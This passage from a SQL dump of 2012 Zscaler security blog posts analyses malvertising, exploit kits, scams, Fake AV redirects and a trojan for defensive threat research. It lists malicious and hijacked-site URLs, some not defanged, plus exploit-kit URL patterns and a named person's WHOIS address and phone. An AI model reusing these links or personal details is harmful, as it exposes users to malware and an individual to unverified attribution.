behtyg.info (208.76.54.210) - the same IP, reported March 12, 2012.\r\n\r\n \r\n\r\nLooking up other domains that resolved to this same IP shows an interesting history of this recent, on-going campaign. These are some of the domains that resolved to this IP - most/all registered within the last few days, all have the same registrant info, but the emails vary (presumably to get around bulk registration checks):\r\n\r\n\r\n \r\n\r\n	\r\n		\r\n			Domain\r\n			Registrant Email\r\n		\r\n		\r\n			behtyg.info\r\n			srtyhe@mail.com\r\n		\r\n		\r\n			beokjr.info\r\n			afety@mail.com\r\n		\r\n		\r\n			bikegf.info\r\n			moyde@mail.com\r\n		\r\n		\r\n			byjeik.info\r\n			afety@mail.com\r\n		\r\n		\r\n			cehrty.info\r\n			centner@mail.com\r\n		\r\n		\r\n			cekioj.info\r\n			srtyhe@mail.com\r\n		\r\n		\r\n			cekuij.info\r\n			fendihy@mail.com\r\n		\r\n		\r\n			chertyu.info\r\n			qdesa@mail.com\r\n		\r\n		\r\n			chgdjk.info\r\n			zfert@mail.com\r\n		\r\n		\r\n			chtygf.info\r\n			nelius@mail.us\r\n		\r\n		\r\n			cmuijy.info\r\n			zfert@mail.com\r\n		\r\n		\r\n			dgeryt.info\r\n			qdesa@mail.com\r\n		\r\n		\r\n			ggtyut.info\r\n			srtyhe@mail.com\r\n		\r\n		\r\n			nehuikj.info\r\n			srtyhe@mail.com\r\n		\r\n		\r\n			nuekhg.info\r\n			zfert@mail.com\r\n		\r\n		\r\n			vejuyt.info\r\n			nelius@mail.us\r\n		\r\n		\r\n			zehryu.info\r\n			drijed@mail.com\r\n		\r\n	\r\n\r\n\r\n\r\n \r\n\r\nRegistrant Information:\r\nRegistrant Name:Filippovskiy Aleksandr\r\nRegistrant Organization:DOM\r\nRegistrant Street1:ylica Baymana. dom 9.korpys A. kvartira 106\r\nRegistrant Street2:\r\nRegistrant Street3:\r\nRegistrant City:yoshkar ola\r\nRegistrant State/Province:yoshkar ola\r\nRegistrant Postal Code:42400\r\nRegistrant Country:RU\r\nRegistrant Phone:+7.79276827596\r\nRegistrant Phone Ext.:\r\nRegistrant FAX:\r\nRegistrant FAX Ext.:\r\n\r\nDomainTools shows that there have been about 1200 domains registered with this whois information (e.g., search by phone number). We\'re now seeing 199.59.166.86 used for resolution of the chgdjk.info domain (part of a Black Lotus Communications /24 netblock). Clearly a decent-sized and dynamic malware campaign currently leveraging malvertising to redirect to exploit kit sites.\r\n\r\n \r\n\r\nUnfortunately our replay attempts have been unsuccessful at pulling down the malware content- to include using forged headers (such as user-agent and referrer) as well as beginning from the initial transaction chain. This is a common problem when analyzing malvertising incidents - since the malware is injected as part of an advertisement rotator site, it is difficult to replay as the advertisements and key variables used to drive the advertisement (in this case malware) may change. We will update if there are additional details.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/anatomy-going-malvertising-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (315, '\"Check Who Is Visiting Your Profile\" Scam On Russian Social Network Vkontakte', 'Julien Sobrier', 'March 07, 2012', 'Vkontakte is the Russian equivalent of Facebook and has been criticized for being a direct \"clone\". Well, scammers are \"cloning\" the most popular Facebook scams and porting them to this Russian platform as well.    One recurring scam, used to trick people into giving up credentials to their Facebook account, or executing a cross-site scripting attack against themselves, has it\'s equivalent at Vkontakte: hxxp://gosti-vk.p7h.in/?r=3262.    Here is a screenshot of the page translated into English:       	  		  			  		  		  			Scam site  		  	    The site claims to be an official Vkontakte application (with a .in TLD!). The page uses the same logo, layout and colors as the official site. The fake user testimonials explain that they have found likely lovers checking out your profile.    You need to give your ID or profile link (no password required) to let the \"app\" figure out who is viewing your profile:       	  		  			  		  		  			Form (translated in English) to enter user ID  		  	    I inserted a fake name (in English) and the app miraculously found 7 people who had looked at my profile!       	  		  			  		  		  			Name of people who visited by non-existent profile  		  	    Before I had time to click on any links, I was also asked to enter my cell phone number to ensure that I was indeed a human:       	  		  			  		  		  			Phone number must be entered  		  	      This is where the Russian scam differs from the Facebook scam. In the US, scammers try to get users to fill out surveys, install spyware or try \"free\" offers. In Russia, as shown in other scams, scammers make money by sending SMS messages with a surcharge.', 'Social Engineering', 'https://www.zscaler.com/blogs/research/check-who-visiting-your-profile-scam-russian-social-network-vkontakte');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (316, 'Are Pinterest \"Pin It\" Going The Way Of Facebook \"Like\"?', 'Julien Sobrier', 'March 05, 2012', 'Pinterest is a new social network that has been getting a lot of press lately. Basically, Pinterest is a virtual board, where users can pin things they like online. They can share the content with their friends, follow other people, etc.My Pinterest boardLike Facebook, Pinterest users can add items to their board from the website, but also by clicking on \"Pin it\" widgets set up by webmasters on any website, which are equivalent of the Facebook \"like\" widgets. Any new pin shows up as a notification for all people following you. Although Pinterest is very new (you need to first apply for an invitation to get your login after a couple of days) and has a small number of users, spammers are already abusing the \"Pin it\" widget.This week, I found spam campaigns at pinterestpromo.info and giftinterest.com that use Pinterest as the main tool to propagate scams.pinterestpromo.comThe scam is very similar to some previous Facebook spam campaigns: users have to click on the \"Pin it\" widget in order to receive a free iPhone or iPad. On these two sites, scammers have used a fake \"Pin it\" widget rather than the official widget code.After clicking on the widget, the site redirects to another website, such as:http://www.giftsforshoppers.com/aseg-1142?trkSessID=195212565&dLID=5084&pRdrTrkID=667421271&skipExit=[skipExit]&pLeadEmailAddress=[pLeadEmailAddress].www.giftsforshoppers.comThe scam is the same as one that I described last week for a Groupon scam: the visitor has to fill out surveys or trial offers in the hope of getting a gift card or some other gadget.Any website with features to spread links quickly to a trusted group of people is doomed to be abused by spammers.', 'Social Engineering;Phishing', 'https://www.zscaler.com/blogs/research/are-pinterest-pin-it-going-way-facebook');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (317, 'Fake AV: .ru Sites Used For Redirections', 'Julien Sobrier', 'February 28, 2012', 'This past month, I\'ve seen an increase in hijacked sites redirecting to a Fake AV page. These attacks typically involves three separate phases:          The hijacked website redirects users coming from a Google search to an external domain.      A website redirects users to the Fake AV page or to a harmless site (mostly bing.com and google.com) depending upon the referer in step #1. This page adds a cookie using JavaScript, and reads it immediately, to make sure the page was accessed by a real browser that supports both JavaScript and cookies.      The fake AV page is delivered.            Hijacked sites        I demonstrated last year that the Blackhat SEO attacks had migrated from the most popular searches to more specific searches like buying software online where up to 90% of the links returned are malicious. It comes as no surprise that about 95% of the hijacked sites were found for searches like \"purchase microsoft word\", \"achat windows\" (\"buy Windows\" in French), \"precio office 2007\" (Italian), etc.        There were 12 hijacked sites being used, with 3 domains representing 90% of the hijacked sites redirecting to a fake AV page:          politicalcampaignexpert.com (WordPress)      www.extralast.com (WordPress)      www.ukresistance.co.uk (blocked by Google Safe Browsing)        Redirection site        The domain used to redirect users from the hijacked sites to the fake AV pages are all .ru sites, with the same URL path:          bannortim-qimulta.ru/industry/index.php      daliachuuaroyalys.ru/industry/index.php      bannortim.ru/industry/index.php      uaroyalysdaliachu.ru/industry/index.php      uaroyalys.ru/industry/index.php      etc.        This page is used to differentiate between real browsers and bots or scanners. It uses JavaScript to write a cookie, and then reads it immediately thereafter. If the cookie is retrieved, the visitor is redirected to a malicious site, otherwise they are redirected to Bing or Google. Here is the snipped of the source code:                                                 JavaScript and Cookie support test                            Fake AV page                                                 Fake AV page                        Attackers are getting lazy! The fake AV page looks the same as it did two years ago and the source code of the page has barely changed. Fake AV pages used to change every 2-3 weeks when they were found all over the most popular searches, now they are remaining stagnant for six months. Here is the video that shows the Fake AV page in action:            As you can see in the video, the malicious executable is detected by 14 of 43 AV vendors.        Hopefully, one day Google will clean up the search results related to buying software as they did for the most popular searches. Until then, many users will end up on fake stores, fake AV pages or other malicious sites.', 'AntiVirus;Compromise;Malware', 'https://www.zscaler.com/blogs/research/fake-av-ru-sites-used-redirections');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (318, 'Groupon Scam Site', 'Julien Sobrier', 'February 21, 2012', 'groupon500.com was registered in Feb 20, 2012. The home page for the domain claims to offer a free $500 voucher for Groupon or LivingSocial, another popular daily-deal site.groupon500.comUsers must fill out a form with their information, including a phone number:users must share their informationTo get the $500 voucher, the user must complete one offer: buy Disney Books, try a tooth whitening, etc. And with one more offer completed, they can even get a free iPod Touch!One or more offer must be completedThe site earns money by getting users into \"free\" trial offers where users are charged without realizing most of the time.The saddest part of all - this is perfectly legal. groupon500.com was published by RETAILBRANDPRIZE.COM. Search for this name in Google and you will find no shortage of people complaining about various scams.The Privacy information, Terms and Conditions and small print are clear on what is occurring, although must users will of course ignore them. The vendor uses personal information \"to provide your contact information to our marketing partners\", \"By Participating, You Expressly \"Opt In\" to \"Receive Information And Grant Us Permission To Share Your Information\", \"Completion of reward offers most often  requires a purchase or filing a credit application and being accepted  for a financial product such as a credit card or consumer loan. \", etc.If it is too good to be true, it\'s probably... a scam!', 'Abuse', 'https://www.zscaler.com/blogs/research/groupon-scam-site');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (319, 'Analysis Of A Blackhole Exploit Page', 'Julien Sobrier', 'February 20, 2012', 'The Blackhole Exploit kit is still a very popular attack on the web. They are many variants of the threat. Here is a detailed analysis of one Exploit kit page and the obfuscation technique leveraged by the attack.In this example, the exploit is heavily obfuscated. The exploit has been encoded and stored as HTML and JavaScript is used to decode the payload and run it.Blackhole Exploit encoded ans stored in HTMLJavaScript decoding loopTo decode the exploit, I used Malzilla, a popular JavaScript deobfuscation tool. Malzilla cannot manipulate the DOM like a real web browser, so I needed to copy and past the HTML-encoded data into a JavaScript variable. I then changed the JavaScript loop slightly, to extract the data from the variable instead of the HTML. Instead of doing an eval() of the code, I replaced the last line with document.write(c) to output the result.The code below was delivered by Malzilla following the aforementioned adjustments (I\'ve cut out the encoding data):Modified code to run in MalzillaI can now execute the script. The obfuscation requires many passes to fully decode the data andit takes quite a while to complete.Script executed by MalzillaNow, let\'s examine the output from Malzilla. The first part addresses a \"Please wait page is loading...\" message, very typical of the Blackhole Exploit kit so that the victim remains patient while the exploit code executes.Then, the JavaScript figures out which browser is visiting the page, what plugins are installed and with which version. This is subsequently to decide which exploit payloads to deliver.Browser fingerprintingDepending on what browser information was obtained, different exploits can be delivered. It could for example be a malicious Java applet:Launch a malicious Java applet... or a remote code execution targeting a known Internet Explorer vulnerability:MDAC exploit for Internet Explorer.. or a malicious PDF file:Malicious external PDF file... or a malicious Flash file:Malicious Flash fileSeparating the exploit into an encoded payload and a decoding loop made it easier for the exploit kit creators to create an infinite array of different pages in order to evade detection. The Exploit kit is also more sophisticated than many other exploits as it is able to use the right exploit for each visitor.', 'Analysis;Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/analysis-blackhole-exploit-page');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (320, 'Follow Up On Russian Scam', 'Julien Sobrier', 'February 13, 2012', 'Last week, I described how many websites hosted on DreamHost had been hijacked.Since then, I found the same scams on websites hosted with different providers.Often, vulnerable sites are hacked by many groups for various purposes including spam delivery, such as Blackhat SEO, other scams, etc. Many of the sites hosting the Russian scams are now used for other malicious purposes.Blackhat SEOOne of the parameters that is used to determine the rank of a web site in the search results is the number of links to a given page. As such, spammers take advantage of vulnerable sites by adding links to site that the attackers want to promote and these links are often hidden from visitors to the page. The most common technique used involves adding a hidden DIV tag at the end of the page. This was done on http://goingonfive.com/ for example:Spam linksIn this example, the DIV tag is moved out of the screen, to the left. The links for Viagra and other drugs point to other pages uploaded on the same site (in the /include folder), as well as to other hijacked websites (http://airtravel-services.com/js/index.html, etc.).The spam pages claim to be a \"Google Pharmacy\":http://goingonfive.com/includes/The pages then link to grand-pills.com where people can order the drugs:http://www.grand-pills.com/catalog/Erectile_Dysfunction/Cialis.htmThere is also a second groups of spam links hidden on http://goingonfive.com/. These links point directly to Canadian Pharmacy sites, rather than using hijacked sites for redirection. These links may have been added by a different group.Hidden spam linksOne of the Canadian Pharmacy sites is http://viagra7online.com/:Canadian PharmacyAmerican and other Russian scamsThe Russian scam I reported on initially is using  http://goingonfive.com/modules/mod_wdbanners/resmmdnd.php. The directory /modules/mod_wdbanners/ contains many other pages redirecting to other scams.Pages uploaded on http://goingonfive.com/ You can find the same list of files on other DreamHost sites: http://dev.orioncombat.com/wp-content/uploads/, http://chicagoexposedstrippers.info/wp-content/plugins/extended-comment-options/, etc.Most of these pages redirect to another Russian scam at http://arhivi-familii.com/. I noticed this one about a month ago.http://arhivi-familii.com/At this site, you are supposed to be able to lookup information on the family tree of anybody. The service looks free, but at the very bottom of the page the site mentions that the user will be charged 186 rubles every 10 days via SMS. Many people have complained about high charges for no actual service on Russian forums. Here are the cost details translated in English:the service is NOT free!Two other pages redirect to a US scam that I detailed in an earlier post: get rich working from home, which abuses a Facebook Like widget to look legitimate.\"Work from home\" scamThese sites will probably host more and more spam and malicious content until they get blacklisted by popular lists, at which point, the hackers will move to new targets.', 'Analysis', 'https://www.zscaler.com/blogs/research/follow-russian-scam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (321, 'DreamHost: Hijacked Websites Redirect To Russian Scam', 'Julien Sobrier', 'February 03, 2012', 'Following the Dreamhost hack, that was revealed this week, many websites hosted by the company have been hijacked to redirect users to a Russian scam page.    I\'ve identified hundreds of websites hosted by DreamHost that contained a PHP page redirecting to hxxp://www.otvetvam.com/. Here are a few examples:    	http://www.lciva.com/wp-content/plugins/extended-comment-options/gyrewnv.php  	http://honorboundphoto.net/photos/10007-mankato_habitat_for_humanity_golf_tournament/agtruje.php  	http://ryanmasters.ca/wp-content/gallery/our-kingdom/thumbs/tyiueg.php  	http://treatmentofpanicattacks.com/wp-content/cache/supercache/www.treatmentofpanicattacks.com/category/anxiety-support/polzin.php  	http://r4theband.co.uk/content/wp-content/themes/agregado/includes/cache/gyrewnv.php   	http://dedehaluk.com/cache/hakkinda/fgjke.php  	http://www.agustindondo.co.uk/yellowbrick/wp-content/files_flutter/modules/fgjke.php   	http://dcstavclub.org/wp-content/themes/newzen_2.0_build_105/images/fgndnju.php   	http://camtarn.org/gizmoblog/content/06/03/entry060305-180312/comments/fgjke.php   	http://derek.hinchy.org/MT-5.031-en/mt-static/support/theme_static/professional_website/themes/professional-green/polzin.php  	http://ojosdelmundo.dreamhosters.com/images/comprofiler/gallery/tghreig.php      otvetvam.com promotes a common \"get rich working from home\" scam. On the left side, all links point to the same collection of fake testimonies from people purporting to have made plenty of money using the system.         	  		  			  		  		  			hxxp://www.otvetvam.com/  		  	         The right side of the page, looks like Adsense ads from Google (same font, same colors, layout, etc.), but they are all links to www.tvoitube.com. This is a YouTube look-alike site, which contains a video shown promoting an online gambling site (www.cristal-casino.com).       	  		  			  		  		  			Fake Russian YouTube site http://www.tvoitube.com/  		  	      www.otvetvam.com copied the layout of the popular Russian site, mail.ru. The source code actually reveals that the page was created from http://otvet.mail.ru/question/59882991/, which has now been blocked by mail.ru.      The hijacked sites now redirect to other websites including ru-0tveti.com, ru-0tveti1.com, etc. These domains were registered on 01/25/2012, but no websites are yet hosted at the domains.    I\'m sure this is just the beginning of massive abuses on websites hosted by DreamHost.', 'Abuse;Compromise', 'https://www.zscaler.com/blogs/research/dreamhost-hijacked-websites-redirect-russian-scam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (322, 'MSUpdater Trojan And Link To Targeted Attacks', 'ThreatLabz', 'January 31, 2012', 'This blog post is based on a joint report by Zscaler and Seculert. Researchers from both companies separately identified attacks which used a remote access tool (RAT) malware that apparently targeted defense-related organizations. With joined forces, we analyzed the incidents that we observed and those published in the open-source to identify attack patterns and incidents from early 2009 to present.             Figure 1: Screenshot of Report Heading           The threat arrives in phishing emails with a PDF attachment, possibly related to conferences for the particular targeted industry. The PDF exploits a vulnerability within Adobe (for example, a 0-day exploit was used against CVE-2010-2883) which then drops a series of files to begin communicating with the command and control (C&C).          Figure 2: Screenshot of Example Conference PDF \"Lure\"           The malware dropped and launched from the PDF exploit has been seen to be virtual machine (VM) aware in order to prevent analysis within a sandbox. The Trojan functionality is decrypted at run-time, and includes expected functionality, such as, downloading, uploading, and executing files driven by commands from the C&C. Communication with the C&C is over HTTP but is encoded to evade detection. The Trojan file name (e.g., \"msupdate.exe\") and the HTTP paths used in the C&C (e.g., \"/microsoftupdate/getupdate/default.aspx\") are used to stay under the radar by appearing to be related to Microsoft Windows Update - hence the name given to this Trojan.         Correlating this information with open-source intelligence (OSINT), we were able to find other reports of this Trojan within past targeted incidents, as well as a link to other incidents and compromise indicators. Further details of this information can be read within our joint report. The mission of this report is to inform organizations and security executives about these threats, and assist them in detection and mitigation.', 'APT;Malware', 'https://www.zscaler.com/blogs/research/msupdater-trojan-and-link-targeted-attacks');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (323, 'Introducing Project Zulu', 'Michael Sutton', 'January 25, 2012', 'I want to personally and publicly thank Julien, Pradeep and Mike for all of their hard work over the past several months, to make today\'s launch of Project Zulu a reality. Zulu is a completely free service, open to anyone, which allows people to determine the risk posed by a particular web resource.Zulu Launch BannerOur goal in building Zulu, was to provide a simple and straightforward interface accessible to anyone regardless of security knowledge, while still delivering granular results that are of value to those that are more security savvy. I believe we\'ve achieved this by providing a UI that requires no additional input beyond the UI to be analyzed, while allowing a few necessary advanced options, (User-Agent and Referer) when encountering malware triggered only when certain input variables are met. Results also display an overall ranking of Benign, Suspicious or Malicious, but also include details of elements that went into the overall score.Zulu User InterfaceWe were also determined not to deliver a \'me too\' project as there are already a number of great security projects available. Services like VirusTotal, Anubis and Wepawet for example, are invaluable tools when running specific tests (multi-AV, JavaScript/PDF analysis and sandboxing respectively). However, most projects such as these tend to focus on a specific threat or type of analysis. With Zulu, we sought to combine our own proprietary scanning techniques, with the great open source intel. that is available, to provide a broad view of the overall risk posed by virtually any web resource. We also look not just at a specific aspect of the resource, but instead, separately focus on determining risk for the content, URL and host separately, which is then combined into an overall risk score. For each component, we employ the following approaches:Zulu results for Zeus Related MalwareContent – Page content is scoured for the inclusion of potentially malicious code leveraging proprietary Zscaler algorithms, conducting heuristic tests and querying public sources.URL – The requested URL is tested against known suspicious/malicious patterns, public black/white lists, as well as historic risk assessments for subdomains, domain TLDs, file types, etc.Host – Historic reputations of the host IP address, Anonymous System Number (ASN) and geographic location are analyzed, along with suspicious behaviors displayed by the host in question.A unique benefit of this approach is that we can deliver a risk score even when the page content is no longer available. While we can\'t access the page, we can still assess the URL and host and when they deliver a high risk score despite a lack of page content, one can often conclude the page was indeed malicious but has since been taken down. We also provide full access to historical scan results for the same resource. This can often uncover when a page first became infected and when it was subsequently cleaned up.Why would Zscaler, a commercial entity, release a free tool? I\'m sure that companies release free tools for a variety of reasons and ours are quite straightforward. Obviously Zulu provides a marketing benefit, but beyond this, it permits ThreatLabZ great freedom to experiment with new detection techniques. We plan to use Zulu as a proving ground for our great ideas (and yes, that makes you our guinea pigs). The benefit to you is that you\'re able to leverage some of our latest and greatest techniques. Moreover, you may well analyze a malicious web site that we haven\'t seen before. In the end, we hope that you find Zulu to be a valuable tool to combat web based threats and we certainly welcome your feedback at zulu[at]zscaler[dot]com.One last thing. Why Zulu? Well, the Zulu warrior was a formidable foe, but more importantly, Zulu warriors represented a citizens army. Not a standing army, but one that came together and fought valiantly when faced with an impending threat to their society. We view our Zulu as a tool for for a citizen army combating malicious content. Everyone can use it and everyone benefits from historical results. Join the army!- michael', 'Malware;Analysis', 'https://www.zscaler.com/blogs/research/introducing-project-zulu');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (324, 'Fake Missing Plugin Warnings Used For Spam/spyware', 'Julien Sobrier', 'January 25, 2012', 'A key element for a successful spam/malicious page is to establish trust with the visitor so that he will perform the requested actions. Users trust their browser, but not necessarily the content (i.e. web page) that it displays. A trick that I\'ve blogged about earlier, is to fool the user into thinking that certain elements on the page are actually from the browser.Recently, I\'ve seen several websites showing a fake warning for a missing plugin. The fake warning is designed to look the same as the real warning shown by Firefox when the page requires a plugin that is not installed: a yellow bar at the top of the page with a link to install the plugin on the right, and a blue icon on the left.Legitimate Firefox warning for a missing Adobe Shockwave pluginOn allostreaming.biz (French language), the fake warning is for a \"missing\" VLC plugin. You can tell that the warning is part of the page, and not part of the browser, because the scroll bar goes to the top of the warning, whereas the real warning is above the scroll bar (see the image above).Fake warning for missing pluginA look at the source code shows that the warning is indeed HTML from the page:HTML code for the fake warningThe \"VLC plugin\" is the classic pay-per-install bundle, where the spammer gets paid for tricking the users into installing spyware/adware.The spammers are using the same fake warning on all browsers, which is also a giveaway as browsers other than Firefox don\'t actually have the same warning for missing plugins. Anyway, the attack will likely fool users of other browsers into installing this adware/spyware.', 'Analysis;Advertising;Phishing;Malware', 'https://www.zscaler.com/blogs/research/fake-missing-plugin-warnings-used-spamspyware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (325, 'Zscaler Keygen: Beware Of What You Are Looking For', 'Julien Sobrier', 'January 20, 2012', 'Some searches yield more dangerous results than others, for example, looking to buy software online has a 90% risk of bring you to a fake store and free software might not be free of adware/spyware. Looking for \'warez\' is another risky query.    Last week, I received a Google alert for \"Zscaler Likejaking Prevention 1.1.2 for MAC keygen serial crack Apple registration code activation\". Given that Zscaler Likejaking Prevention is a free tool that we provide, it certainly doesn\'t need a keygen utility!       	  		  			  		  		  			hxxp://mycleverlab.com/zscaler-likejaking-prevention-1-1-2-free-download.htm  		  	      The download link brings the user to firstclass-download.com. Downloading this specific file requires an account on firstclass-download.com which costs $1.99/month, plus a $69.95 one-time fee! At best, this money will allow you to download what is already available for free on multiple websites (Zscaler, Mozilla add-ons, Softpedia, etc.). At worst, users are paying to get a malware or spyware.       	  		  			  		  		  			firstclass-download.com  		  	      This is the same technique I described in an earlier post related to Blackhat spam SEO. There are a lot of websites similar to mycleverlab.com. A search for \"Zscaler keygen\" shows many sites using the same trick: wacky-wii.com, dwlfile.com, zengenix.com, cracksguru.com, zengenix.com, etc.    Always go to the official source to download any software. If you want \"Zscaler Likejacking Prevention for MAC\", go directly to Zscaler\'s website. No need to pay for what is already free!', 'Phishing', 'https://www.zscaler.com/blogs/research/zscaler-keygen-beware-what-you-are-looking');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (326, 'SOPA Protest: Wikipedia Traffic Trend (updated)', 'ThreatLabz', 'January 19, 2012', 'Updated 1/19: we have updated charts and the narrative to reflect all of 1/18 (protest timeframe) data and the first 10 hours of today. The last graph shows about a 365% increase in visits to their SOPA Initiative page and >77% increase across SOPA related page visits during the protest - this visually shows the success of Wikipedia\'s protest in which it is successfully spreading their message and educating visitors on SOPA. The middle graphs visually show an increase in unique visitors, while the number of transactions per visitor decreases throughout the protest - a phenomena that we have called \"online rubber necking,\" in which visitors are there to see the protest page and perhaps inform themselves about the issue but are not accessing the site in the \"normal\" manner in which many more pages/media files are accessed.\r\n\r\n \r\n\r\n\r\nIf you want a quick way of increasing traffic to your website - change or take down portions of your website in protest ... at least that is what we have gleaned from today\'s (1/18) Wikipedia protest against SOPA. There will likely be other blog posts and stats released on the results of this and other cyber protests - here is what we have seen from traffic thus far that has passed through one of Zscaler\'s clouds.\r\n\r\n \r\n\r\nWe observed a noticeable percentage increase in the unique visits (by client IP address) to Wikipedia comparing the protest timeframe to the surrounding dates:\r\n\r\n\r\n\r\n\r\nHowever, these additional visitors are not incurring that much more bandwidth for Wikipedia - we have noticed only a slight percentage increase in Wikipedia web transactions today. See the chart below to see the slight increase in number of transactions per hour:\r\n\r\n\r\nWe can combine the two above graphs into a graph of transactions per unique visitor, and we see that this is much smaller today. This suggests that more people are flocking to Wikipedia today, but just to see the protest page and some details on SOPA. This behavior could be described as \"online rubber necking\".\r\n\r\n\r\n\r\n\r\nWe observed significantly more visits to Wikipedia\'s main page and SOPA Initiative page than the surrounding dates - further corroborating our above statements:\r\n\r\n\r\nFrom the above stats we are able to visually represent the Wikipedia protest and the Internet community\'s \"rubber necking\" behavior in which the number of visitors increase but the transactions per vistor decreases. While not the goal of Wikipedia\'s protest, from a media and public relations standpoint these types of Internet events can stand to be beneficial or even lucrative. This last graph shows a large volume of people checking out the protest page. However, there too was about a 365% increase (going from about 16% to 75% of the visits) in visits to their SOPA Initiative page and >77% increase (going from about 9% to 16% of the visits) across SOPA related page visits during the protest - this visually shows the success of Wikipedia\'s protest in which it is successfully spreading their message and educating visitors on SOPA. I would expect that this may be a sign of the times to come given the successful results of the protest on the Internet and that the message was received on Capitol Hill (reference on which Senators dropped support for SOPA).', 'Analysis', 'https://www.zscaler.com/blogs/research/sopa-protest-wikipedia-traffic-trend-updated');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (327, 'Popularity Of Exploit Kits Leading To An Increase In Compromised Websites', 'ThreatLabz', 'January 16, 2012', 'The dominance of exploit kits like Blackhole, Incognito and others, continues to be seen in the wild. Attackers continue to use these exploit kits to generate malicious webpages and host them on various domains. These exploit kits usually targets browser and browser plugin vulnerabilities.\r\n\r\nTo increase the likelihood of a successful attack, exploit kits are commonly used to infect legitimate sites that already have significant traffic. Attackers achieve this by crafting scripts designed to identify sites with injection vulnerabilities, which allow for hidden iFrames to be written, which then point to the exploit kit URL. When users visit the infected sites and are redirected to the browser exploit kits, a known browser or plugin vulnerability is typically used to download and execute malicious content without user knowledge. You can visit this related blog for more information about iFrame injection in detail.\r\n\r\n \r\n\r\nRecently, I’ve seen a spike in such compromised sites, which lead to exploit kit URLs. In most cases, the JavaScript code containing the hidden iFrame is heavily obfuscated. Different exploit kits have their own techniques to obfuscate malicious code. Let’s take look at a couple of examples and their respective de-obfuscated code.\r\n\r\niFrame leading to Incognito exploit kit\r\nURL: hxxp://www.snapstudios.net/kitchen-set-hidden-behind-the-cupboard.html\r\n\r\nObfuscated code:\r\n\r\n\r\n\r\nThe aforementioned obfuscated code was injected at the start of the webpage. Let’s deobfuscate the code to make sense of it.\r\n\r\nDe-obfuscated code:\r\n\r\n\r\n\r\n \r\n\r\nYou can see that the deobfuscated code generates a hidden iFrame with the ‘src’ attribute being assigned the exploit kit URL. Generally, the visibility of the iFrame is kept hidden and dimensions are kept to a minimum, which ensures that the iFrames don’t alter the look and feel of the page.\r\n\r\nExploit kit URL: hxxp://racingengines.osa.pl/showthread.php?t=63942072\r\n\r\nAfter observing patterns in the exploit URL, one can determine that this URL belongs to the Incognito Exploit kit.\r\n\r\nSuspicious URL Pattern: “/showthread.php?t=”\r\n\r\nSearch results for the above pattern at www.malwaresomainlist.com confirms that URL belongs to the well known Incognito exploit kit. The exploit kit URL is still active but currently not delivering the malicious code. Visit this blog on Incognito exploit kit for more details.\r\n\r\niFrame leading to Blackhole exploit kit\r\nURL: hxxp://steelrode.com/\r\n\r\nObfuscated code:\r\n\r\n\r\n\r\nDe-obfuscated code:\r\n\r\n\r\n\r\nExploit kit URL: hxxp://brighttz.com/main.php?page=dac9bd89165e2708\r\n\r\nSuspicious URL pattern : “/main.php?page=”\r\n\r\nSearch results for the suspicious pattern at www.malwaredomainlist.com can be found here. The exploit kit URL is not currently active. We have been writing about the Blackhole exploit kit for some time. At present, this seems to be the favored exploit kit amongst attackers. You can find more information about the Blackhole exploit kit here.\r\n\r\nFortunately, the aforementioned exploit kit URLs have been blocked by Google Safe Browsing. A sample Google diagnostic report of the Incognito exploit kit URL can be found here. While conducting research I came across a number of such compromised websites on a daily basis. Attackers continually alter obfuscated code to ensure that it is not yet detected by popular AV/IPS/IDS vendors. This keeps them one step ahead in this ongoing game of cat and mouse.\r\n\r\nTo conclude, I would like to say,\r\n\r\n“The growth in compromised websites is directly proportional to the growth in popularity of different exploit kits”.\r\n\r\nPradeep', 'Analysis;Exploit Kit;Hacktivism', 'https://www.zscaler.com/blogs/research/popularity-exploit-kits-leading-increase-compromised-websites');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (328, 'An Example Of Likejacking (Facebook Clickjacking)', 'Julien Sobrier', 'January 10, 2012', 'Last year, we released Zscaler Likejacking Prevention, a free browser extension to protect users from clickjacking leveraging Facebook widgets. Since then, I\'ve seen many websites using Likejacking as their \"business model\" (i.e. this is how they get traffic to their spam site).    Usually, these spam websites try to get the user to click on a specific area of the page where they have hidden one or more \'Like\' buttons. Recently, we found a website where the hidden Facebook \'Like\' button follows the mouse throughout the page. No matter where you click, you hit the Like button.       	  		  			  		  		  			Hidden Like widget follows the mouse  		  	      The technique to hide the button, has however been seen previously. There are hidden DIV elements with the opacity set to 0.0.1, which makes them transparent, although they are in the foreground. The position is set to absolute so that it can move anywhere on the page.    Here is a video that explains how it works:              You can get the free Zscaler Likejacking Prevention extension for Firefox, Google Chrome, Safari and Opera on our website.', 'Analysis;Phishing', 'https://www.zscaler.com/blogs/research/example-likejacking-facebook-clickjacking');
